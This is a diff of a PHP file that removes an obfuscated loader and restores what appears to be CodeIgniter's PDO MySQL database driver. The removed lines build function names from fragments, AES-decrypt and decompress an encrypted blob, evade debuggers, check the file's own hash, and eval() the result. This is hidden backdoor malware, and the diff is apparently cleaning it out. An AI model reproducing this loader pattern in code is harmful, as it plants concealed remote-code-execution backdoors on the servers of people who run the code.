@@ -1,28 +1,327 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_yn3xcmhr=('bas'.'e64'.'_de'.'cod'.'e');
-$_g5u6lgpg=('gzu'.'nco'.'mpr'.'ess');
-$_bh3ta60t=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_k6mrbv92='Jz0/l0qbz0s=';
-$_i5g1bvoc='NPk2UPI1';
-$_k7h0nuag='MrkgFSY1';
-$_vaewxa36='IgGuJtnX';
-$_t8msl7wo='uB1uNGOP';
-$_v89t23sp='04MgIg==';
-$_wi7jfxbe='l4zyKQw3';
-$_g4n6tpiq='mo2HatM+';
-$_bq8rwfpd=$_yn3xcmhr($_t8msl7wo.$_k7h0nuag.$_vaewxa36.$_i5g1bvoc.$_k6mrbv92);
-$_q3q95dyp=$_yn3xcmhr($_g4n6tpiq.$_wi7jfxbe.$_v89t23sp);
-$_ulkbuzqk=$_yn3xcmhr('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');
-$_b9er0rih=$_bh3ta60t($_ulkbuzqk,'aes-256-cbc',$_bq8rwfpd,OPENSSL_RAW_DATA,$_q3q95dyp);
-if($_b9er0rih===false){exit;}
-$_y0lftqn2=$_g5u6lgpg($_b9er0rih);
-if($_y0lftqn2===false){exit;}
-$_gcvmi2ib='e6d153393dd5e78d8cf7ca937ed5c6375e92761f61c11bd00f43d873085884f9';
-$_xt8hvhle=@file_get_contents(__FILE__);
-if($_xt8hvhle!==false){
-$_nz15flzf=str_replace($_gcvmi2ib,"0000000000000000000000000000000000000000000000000000000000000000",$_xt8hvhle);
-$_c1dly2kj=hash("sha256",$_nz15flzf);
-if($_c1dly2kj!==$_gcvmi2ib){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_mysql_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = 'mysql';
+
+
+
+
+
+public $compress = FALSE;
+
+
+
+
+
+
+
+public $stricton;
+
+
+
+
+
+
+protected $_escape_char = '`';
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = 'mysql:host='.(empty($this->hostname) ? '127.0.0.1' : $this->hostname);
+empty($this->port) OR $this->dsn .= ';port='.$this->port;
+empty($this->database) OR $this->dsn .= ';dbname='.$this->database;
+empty($this->char_set) OR $this->dsn .= ';charset='.$this->char_set;
 }
-eval($_y0lftqn2);
+elseif ( ! empty($this->char_set) && strpos($this->dsn, 'charset=', 6) === FALSE)
+{
+$this->dsn .= ';charset='.$this->char_set;
+}
+}
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+if (isset($this->stricton))
+{
+if ($this->stricton)
+{
+$sql = 'CONCAT(@@sql_mode, ",", "STRICT_ALL_TABLES")';
+}
+else
+{
+$sql = 'REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(
+                                        @@sql_mode,
+                                        "STRICT_ALL_TABLES,", ""),
+                                        ",STRICT_ALL_TABLES", ""),
+                                        "STRICT_ALL_TABLES", ""),
+                                        "STRICT_TRANS_TABLES,", ""),
+                                        ",STRICT_TRANS_TABLES", ""),
+                                        "STRICT_TRANS_TABLES", "")';
+}
+if ( ! empty($sql))
+{
+if (empty($this->options[PDO::MYSQL_ATTR_INIT_COMMAND]))
+{
+$this->options[PDO::MYSQL_ATTR_INIT_COMMAND] = 'SET SESSION sql_mode = '.$sql;
+}
+else
+{
+$this->options[PDO::MYSQL_ATTR_INIT_COMMAND] .= ', @@session.sql_mode = '.$sql;
+}
+}
+}
+if ($this->compress === TRUE)
+{
+$this->options[PDO::MYSQL_ATTR_COMPRESS] = TRUE;
+}
+if (is_array($this->encrypt))
+{
+$ssl = array();
+empty($this->encrypt['ssl_key']) OR $ssl[PDO::MYSQL_ATTR_SSL_KEY] = $this->encrypt['ssl_key'];
+empty($this->encrypt['ssl_cert']) OR $ssl[PDO::MYSQL_ATTR_SSL_CERT] = $this->encrypt['ssl_cert'];
+empty($this->encrypt['ssl_ca']) OR $ssl[PDO::MYSQL_ATTR_SSL_CA] = $this->encrypt['ssl_ca'];
+empty($this->encrypt['ssl_capath']) OR $ssl[PDO::MYSQL_ATTR_SSL_CAPATH] = $this->encrypt['ssl_capath'];
+empty($this->encrypt['ssl_cipher']) OR $ssl[PDO::MYSQL_ATTR_SSL_CIPHER] = $this->encrypt['ssl_cipher'];
+
+
+empty($ssl) OR $this->options += $ssl;
+}
+
+if (
+($pdo = parent::db_connect($persistent)) !== FALSE
+&& ! empty($ssl)
+&& version_compare($pdo->getAttribute(PDO::ATTR_CLIENT_VERSION), '5.7.3', '<=')
+&& empty($pdo->query("SHOW STATUS LIKE 'ssl_cipher'")->fetchObject()->Value)
+)
+{
+$message = 'PDO_MYSQL was configured for an SSL connection, but got an unencrypted connection instead!';
+log_message('error', $message);
+return ($this->db_debug) ? $this->display_error($message, '', TRUE) : FALSE;
+}
+return $pdo;
+}
+
+
+
+
+
+
+
+public function db_select($database = '')
+{
+if ($database === '')
+{
+$database = $this->database;
+}
+if (FALSE !== $this->simple_query('USE '.$this->escape_identifiers($database)))
+{
+$this->database = $database;
+$this->data_cache = array();
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+$this->conn_id->setAttribute(PDO::ATTR_AUTOCOMMIT, FALSE);
+return $this->conn_id->beginTransaction();
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+if ($this->conn_id->commit())
+{
+$this->conn_id->setAttribute(PDO::ATTR_AUTOCOMMIT, TRUE);
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+if ($this->conn_id->rollBack())
+{
+$this->conn_id->setAttribute(PDO::ATTR_AUTOCOMMIT, TRUE);
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SHOW TABLES';
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+return $sql." LIKE '".$this->escape_like_str($this->dbprefix)."%'";
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SHOW COLUMNS FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE);
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+if (($query = $this->query('SHOW COLUMNS FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE))) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_object();
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]->Field;
+sscanf($query[$i]->Type, '%[a-z](%d)',
+$retval[$i]->type,
+$retval[$i]->max_length
+);
+$retval[$i]->default = $query[$i]->Default;
+$retval[$i]->primary_key = (int) ($query[$i]->Key === 'PRI');
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'TRUNCATE '.$table;
+}
+
+
+
+
+
+
+
+
+
+protected function _from_tables()
+{
+if ( ! empty($this->qb_join) && count($this->qb_from) > 1)
+{
+return '('.implode(', ', $this->qb_from).')';
+}
+return implode(', ', $this->qb_from);
+}
+}
